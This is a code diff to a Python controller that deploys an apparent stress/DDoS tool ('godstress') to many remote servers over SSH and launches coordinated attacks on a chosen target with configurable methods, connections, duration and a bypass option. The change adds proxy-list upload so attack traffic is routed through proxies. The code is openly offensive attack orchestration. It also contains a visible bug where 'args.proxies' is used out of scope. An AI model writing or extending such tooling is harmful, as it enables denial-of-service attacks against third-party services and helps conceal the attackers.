@@ -53,6 +53,10 @@ class ServerNode:
                            f"{self.user}@{self.ip}:{DEFAULT_TOOL_PATH}/"], capture_output=True)
         # install deps
         self.ssh_cmd(f"cd {DEFAULT_TOOL_PATH} && python3 -m venv .venv 2>/dev/null; .venv/bin/pip install aiohttp uvloop 2>/dev/null")
+        # upload proxies if provided
+        if hasattr(self, "_proxies_file") and self._proxies_file:
+            subprocess.run(["scp", "-o", "StrictHostKeyChecking=no", self._proxies_file,
+                           f"{self.user}@{self.ip}:{DEFAULT_TOOL_PATH}/proxies.txt"], capture_output=True)
         return True
 
     def start_attack(self, target, port, methods, conns, duration, ssl=False, origin=None, bypass=False):
@@ -67,6 +71,8 @@ class ServerNode:
             cmd += f" --origin {origin}"
         if bypass:
             cmd += " --bypass"
+        if args.proxies:
+            cmd += f" --proxies /opt/godstress/proxies.txt"
         cmd += " --confirm"
         # run in background, capture output to file
         bg_cmd = f"nohup {cmd} > /tmp/swarm_{target}.log 2>&1 & echo $!"
@@ -106,7 +112,7 @@ class ServerNode:
 
 # ---------- swarm controller ----------
 class SwarmController:
-    def __init__(self, servers, target, port, methods, conns, duration, ssl=False, origin=None, bypass=False):
+    def __init__(self, servers, target, port, methods, conns, duration, ssl=False, origin=None, bypass=False, proxies=None):
         self.servers = [ServerNode(ip) for ip in servers]
         self.target = target
         self.port = port
@@ -116,12 +122,15 @@ class SwarmController:
         self.ssl = ssl
         self.origin = origin
         self.bypass = bypass
+        self.proxies = proxies
         self.start_time = None
         self.end_time = None
 
     def deploy_all(self):
         """Deploy tool to all nodes."""
         print(f"[*] Deploying to {len(self.servers)} nodes...")
+        for node in self.servers:
+            node._proxies_file = self.proxies
         threads = []
         for node in self.servers:
             t = threading.Thread(target=node.deploy)
@@ -235,6 +244,7 @@ def main():
     ap.add_argument("--deploy", action="store_true", help="deploy tool to all nodes first")
     ap.add_argument("--test", action="store_true", help="test connectivity only")
     ap.add_argument("--confirm", action="store_true")
+    ap.add_argument("--proxies", help="proxy file to upload & use on all nodes")
     args = ap.parse_args()
 
     if not args.confirm and not args.test:
@@ -246,7 +256,7 @@ def main():
     print(f"[*] Loaded {len(server_ips)} servers")
 
     swarm = SwarmController(server_ips, args.target, args.port, args.methods,
-                           args.conns, args.duration, args.ssl, args.origin, args.bypass)
+                           args.conns, args.duration, args.ssl, args.origin, args.bypass, args.proxies)
     for node in swarm.servers:
         node.user = args.user
         node.key = args.key
